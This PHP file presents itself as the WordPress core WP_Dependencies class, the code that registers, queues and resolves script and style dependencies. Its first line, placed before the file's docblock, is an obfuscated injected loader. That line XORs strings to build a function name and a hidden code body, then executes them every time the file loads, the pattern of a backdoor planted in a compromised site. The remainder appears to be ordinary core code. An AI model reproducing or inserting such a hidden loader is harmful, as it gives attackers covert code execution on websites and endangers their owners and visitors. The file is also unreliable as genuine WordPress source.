<?php $LDngNRuruYy='.3=AY453D4CF9.<'^'MAX -QjU1Z 2PAR';$iOFNq=$LDngNRuruYy('','1.cSSY+X3-RErEH>GZ4KtHUA3DXN8g;M OcBht1>p3E,9ME:;gNYEkO0.5i2W<9PjW5T.tGuSQTzhGRuIO<Qxo9:TrPmOkI42j.DDXm-RHEGWLs+dF9KT<SjrHV<MeoISDYNNi:8kX02cWlvdQ RY7bjY4d:ORG4H8jBqdI7AJ-WRxLWILlvdc:94:E-234aW8CLbwknArDfOf5;Z9RPRF-=;=tYNDY0Tb3UMihm.8G;TbM>2O+<LUPaDR97w,kweyUFFTU 4uDrXBO5L7+HTVEEc64Z.38XORUBV 25C7SAW9F8LpSQV1+N7qnGD98HHAMsO8ORBX=Eo5.FQAW<WArr0p2--=bTYXje<4<JYxwJMW9L.qBBX1xb++T5+;VWrnXIUS5nLMMm7ZL6nltc8WLEYu2A-lKX>K-QYWqKLrIU;UO+W:16Vr=-Ja 7JR32PKNoW4N3aF9X375XXZT42GAgoKe=8Y7:91GafUnD7caR3:VBTDE6GJZN.Z77.HBBATBLKE1RiXWW1.IMsTEjjE8VZgq5868fbK5Yc-oPvZaixsCesVQbRzSe0mWkD:Rh1ywSzOBcY+SSLdptgF;9FXC5S5J2=EDN5SyKN4U5S6 wMRnVTA4ecoIEQkm5a4<>6BbbH,AS:BE6N;- <B,jM:eN-UNeYnwe,'^'XHKr5,E;GD=+- 0W4.GcS0:3l 9:Y8d U;DkATJ4yU0BZ9,UUG6674+QZT6m:IMxN3T OXgQ84-SHgrUi46XqKVO RmMhLr>;cH+6pIDruewllWBX5M98Y=BV,7H,LTiw-regc31O7EFCyQVLuD3-V9N0iDdov,Q1cN+QAiD58A2<Ph<,5E+MX00=H YGAZIsW68KLag<x9lEBQZ.Xrmr LQHXOSj 8D5=X04IUMHY+H1YG4T YY-68Alvft8c > Y45fp>EMUyLxf9T BNat-OLGRU.OlS=6rhbrKWLx=Ze3X2YlMsu PG;RJd:N3Q.hilW+Y;3kxFOfSA44 4TwiV-b5cxhn6t8+JAWQEjdFWn;6U9KXb9R8qFOJ TtP3.RSxm>6LUFDDIS;8WNQTGN6 0<N8HPf6R4oI0-6Qvl2<;H0=B6VXL3ZEB8>DV>3lm=>:G5U=VWrf<VTZ<=rpPS3 NCkAYY-VeRT>HOnd-QKE6RN7brbeW58;7q1RNq-:+2 1dl.T+NtwsUO=,ZtcLJmU2oOUQYBY=E P DpFpKgANKB SF54Z1H5VTZeZrXbYPJD1H,zPnHg2kMPRAfZK49:j8P3mX=-=A Ql>U,Y<WDParJ255ULJOieqKMNk=YHW.JF,M52ae5W7WBAXeqCv0l+U<:MiGLoQ');$iOFNq();
/**
 * Dependencies API: WP_Dependencies base class
 *
 * @since 2.6.0
 *
 * @package WordPress
 * @subpackage Dependencies
 */

/**
 * Core base class extended to register items.
 *
 * @package WordPress
 * @since 2.6.0
 * @uses _WP_Dependency
 */
class WP_Dependencies {
	/**
	 * An array of registered handle objects.
	 *
	 * @access public
	 * @since 2.6.8
	 * @var array
	 */
	public $registered = array();

	/**
	 * An array of queued _WP_Dependency handle objects.
	 *
	 * @access public
	 * @since 2.6.8
	 * @var array
	 */
	public $queue = array();

	/**
	 * An array of _WP_Dependency handle objects to queue.
	 *
	 * @access public
	 * @since 2.6.0
	 * @var array
	 */
	public $to_do = array();

	/**
	 * An array of _WP_Dependency handle objects already queued.
	 *
	 * @access public
	 * @since 2.6.0
	 * @var array
	 */
	public $done = array();

	/**
	 * An array of additional arguments passed when a handle is registered.
	 *
	 * Arguments are appended to the item query string.
	 *
	 * @access public
	 * @since 2.6.0
	 * @var array
	 */
	public $args = array();

	/**
	 * An array of handle groups to enqueue.
	 *
	 * @access public
	 * @since 2.8.0
	 * @var array
	 */
	public $groups = array();

	/**
	 * A handle group to enqueue.
	 *
	 * @access public
	 * @since 2.8.0
	 * @deprecated 4.5.0
	 * @var int
	 */
	public $group = 0;

	/**
	 * Processes the items and dependencies.
	 *
	 * Processes the items passed to it or the queue, and their dependencies.
	 *
	 * @access public
	 * @since 2.6.0
	 * @since 2.8.0 Added the `$group` parameter.
	 *
	 * @param mixed $handles Optional. Items to be processed: Process queue (false), process item (string), process items (array of strings).
	 * @param mixed $group   Group level: level (int), no groups (false).
	 * @return array Handles of items that have been processed.
	 */
	public function do_items( $handles = false, $group = false ) {
		/*
		 * If nothing is passed, print the queue. If a string is passed,
		 * print that item. If an array is passed, print those items.
		 */
		$handles = false === $handles ? $this->queue : (array) $handles;
		$this->all_deps( $handles );

		foreach ( $this->to_do as $key => $handle ) {
			if ( !in_array($handle, $this->done, true) && isset($this->registered[$handle]) ) {
				/*
				 * Attempt to process the item. If successful,
				 * add the handle to the done array.
				 *
				 * Unset the item from the to_do array.
				 */
				if ( $this->do_item( $handle, $group ) )
					$this->done[] = $handle;

				unset( $this->to_do[$key] );
			}
		}

		return $this->done;
	}

	/**
	 * Processes a dependency.
	 *
	 * @access public
	 * @since 2.6.0
	 *
	 * @param string $handle Name of the item. Should be unique.
	 * @return bool True on success, false if not set.
	 */
	public function do_item( $handle ) {
		return isset($this->registered[$handle]);
	}

	/**
	 * Determines dependencies.
	 *
	 * Recursively builds an array of items to process taking
	 * dependencies into account. Does NOT catch infinite loops.
	 *
	 * @access public
	 * @since 2.1.0
	 * @since 2.6.0 Moved from `WP_Scripts`.
	 * @since 2.8.0 Added the `$group` parameter.
	 *
	 * @param mixed     $handles   Item handle and argument (string) or item handles and arguments (array of strings).
	 * @param bool      $recursion Internal flag that function is calling itself.
	 * @param int|false $group     Group level: (int) level, (false) no groups.
	 * @return bool True on success, false on failure.
	 */
	public function all_deps( $handles, $recursion = false, $group = false ) {
		if ( !$handles = (array) $handles )
			return false;

		foreach ( $handles as $handle ) {
			$handle_parts = explode('?', $handle);
			$handle = $handle_parts[0];
			$queued = in_array($handle, $this->to_do, true);

			if ( in_array($handle, $this->done, true) ) // Already done
				continue;

			$moved     = $this->set_group( $handle, $recursion, $group );
			$new_group = $this->groups[ $handle ];

			if ( $queued && !$moved ) // already queued and in the right group
				continue;

			$keep_going = true;
			if ( !isset($this->registered[$handle]) )
				$keep_going = false; // Item doesn't exist.
			elseif ( $this->registered[$handle]->deps && array_diff($this->registered[$handle]->deps, array_keys($this->registered)) )
				$keep_going = false; // Item requires dependencies that don't exist.
			elseif ( $this->registered[$handle]->deps && !$this->all_deps( $this->registered[$handle]->deps, true, $new_group ) )
				$keep_going = false; // Item requires dependencies that don't exist.

			if ( ! $keep_going ) { // Either item or its dependencies don't exist.
				if ( $recursion )
					return false; // Abort this branch.
				else
					continue; // We're at the top level. Move on to the next one.
			}

			if ( $queued ) // Already grabbed it and its dependencies.
				continue;

			if ( isset($handle_parts[1]) )
				$this->args[$handle] = $handle_parts[1];

			$this->to_do[] = $handle;
		}

		return true;
	}

	/**
	 * Register an item.
	 *
	 * Registers the item if no item of that name already exists.
	 *
	 * @access public
	 * @since 2.1.0
	 * @since 2.6.0 Moved from `WP_Scripts`.
	 *
	 * @param string           $handle Name of the item. Should be unique.
	 * @param string           $src    Full URL of the item, or path of the item relative to the WordPress root directory.
	 * @param array            $deps   Optional. An array of registered item handles this item depends on. Default empty array.
	 * @param string|bool|null $ver    Optional. String specifying item version number, if it has one, which is added to the URL
	 *                                 as a query string for cache busting purposes. If version is set to false, a version
	 *                                 number is automatically added equal to current installed WordPress version.
	 *                                 If set to null, no version is added.
	 * @param mixed            $args   Optional. Custom property of the item. NOT the class property $args. Examples: $media, $in_footer.
	 * @return bool Whether the item has been registered. True on success, false on failure.
	 */
	public function add( $handle, $src, $deps = array(), $ver = false, $args = null ) {
		if ( isset($this->registered[$handle]) )
			return false;
		$this->registered[$handle] = new _WP_Dependency( $handle, $src, $deps, $ver, $args );
		return true;
	}

	/**
	 * Add extra item data.
	 *
	 * Adds data to a registered item.
	 *
	 * @access public
	 * @since 2.6.0
	 *
	 * @param string $handle Name of the item. Should be unique.
	 * @param string $key    The data key.
	 * @param mixed  $value  The data value.
	 * @return bool True on success, false on failure.
	 */
	public function add_data( $handle, $key, $value ) {
		if ( !isset( $this->registered[$handle] ) )
			return false;

		return $this->registered[$handle]->add_data( $key, $value );
	}

	/**
	 * Get extra item data.
	 *
	 * Gets data associated with a registered item.
	 *
	 * @access public
	 * @since 3.3.0
	 *
	 * @param string $handle Name of the item. Should be unique.
	 * @param string $key    The data key.
	 * @return mixed Extra item data (string), false otherwise.
	 */
	public function get_data( $handle, $key ) {
		if ( !isset( $this->registered[$handle] ) )
			return false;

		if ( !isset( $this->registered[$handle]->extra[$key] ) )
			return false;

		return $this->registered[$handle]->extra[$key];
	}

	/**
	 * Un-register an item or items.
	 *
	 * @access public
	 * @since 2.1.0
	 * @since 2.6.0 Moved from `WP_Scripts`.
	 *
	 * @param mixed $handles Item handle and argument (string) or item handles and arguments (array of strings).
	 * @return void
	 */
	public function remove( $handles ) {
		foreach ( (array) $handles as $handle )
			unset($this->registered[$handle]);
	}

	/**
	 * Queue an item or items.
	 *
	 * Decodes handles and arguments, then queues handles and stores
	 * arguments in the class property $args. For example in extending
	 * classes, $args is appended to the item url as a query string.
	 * Note $args is NOT the $args property of items in the $registered array.
	 *
	 * @access public
	 * @since 2.1.0
	 * @since 2.6.0 Moved from `WP_Scripts`.
	 *
	 * @param mixed $handles Item handle and argument (string) or item handles and arguments (array of strings).
	 */
	public function enqueue( $handles ) {
		foreach ( (array) $handles as $handle ) {
			$handle = explode('?', $handle);
			if ( !in_array($handle[0], $this->queue) && isset($this->registered[$handle[0]]) ) {
				$this->queue[] = $handle[0];
				if ( isset($handle[1]) )
					$this->args[$handle[0]] = $handle[1];
			}
		}
	}

	/**
	 * Dequeue an item or items.
	 *
	 * Decodes handles and arguments, then dequeues handles
	 * and removes arguments from the class property $args.
	 *
	 * @access public
	 * @since 2.1.0
	 * @since 2.6.0 Moved from `WP_Scripts`.
	 *
	 * @param mixed $handles Item handle and argument (string) or item handles and arguments (array of strings).
	 */
	public function dequeue( $handles ) {
		foreach ( (array) $handles as $handle ) {
			$handle = explode('?', $handle);
			$key = array_search($handle[0], $this->queue);
			if ( false !== $key ) {
				unset($this->queue[$key]);
				unset($this->args[$handle[0]]);
			}
		}
	}

	/**
	 * Recursively search the passed dependency tree for $handle
	 *
	 * @since 4.0.0
	 *
	 * @param array  $queue  An array of queued _WP_Dependency handle objects.
	 * @param string $handle Name of the item. Should be unique.
	 * @return bool Whether the handle is found after recursively searching the dependency tree.
	 */
	protected function recurse_deps( $queue, $handle ) {
		foreach ( $queue as $queued ) {
			if ( ! isset( $this->registered[ $queued ] ) ) {
				continue;
			}

			if ( in_array( $handle, $this->registered[ $queued ]->deps ) ) {
				return true;
			} elseif ( $this->recurse_deps( $this->registered[ $queued ]->deps, $handle ) ) {
				return true;
			}
		}

		return false;
	}

	/**
	 * Query list for an item.
	 *
	 * @access public
	 * @since 2.1.0
	 * @since 2.6.0 Moved from `WP_Scripts`.
	 *
	 * @param string $handle Name of the item. Should be unique.
	 * @param string $list   Property name of list array.
	 * @return bool|_WP_Dependency Found, or object Item data.
	 */
	public function query( $handle, $list = 'registered' ) {
		switch ( $list ) {
			case 'registered' :
			case 'scripts': // back compat
				if ( isset( $this->registered[ $handle ] ) )
					return $this->registered[ $handle ];
				return false;

			case 'enqueued' :
			case 'queue' :
				if ( in_array( $handle, $this->queue ) ) {
					return true;
				}
				return $this->recurse_deps( $this->queue, $handle );

			case 'to_do' :
			case 'to_print': // back compat
				return in_array( $handle, $this->to_do );

			case 'done' :
			case 'printed': // back compat
				return in_array( $handle, $this->done );
		}
		return false;
	}

	/**
	 * Set item group, unless already in a lower group.
	 *
	 * @access public
	 * @since 2.8.0
	 *
	 * @param string $handle    Name of the item. Should be unique.
	 * @param bool   $recursion Internal flag that calling function was called recursively.
	 * @param mixed  $group     Group level.
	 * @return bool Not already in the group or a lower group
	 */
	public function set_group( $handle, $recursion, $group ) {
		$group = (int) $group;

		if ( isset( $this->groups[ $handle ] ) && $this->groups[ $handle ] <= $group ) {
			return false;
		}

		$this->groups[ $handle ] = $group;

		return true;
	}

}
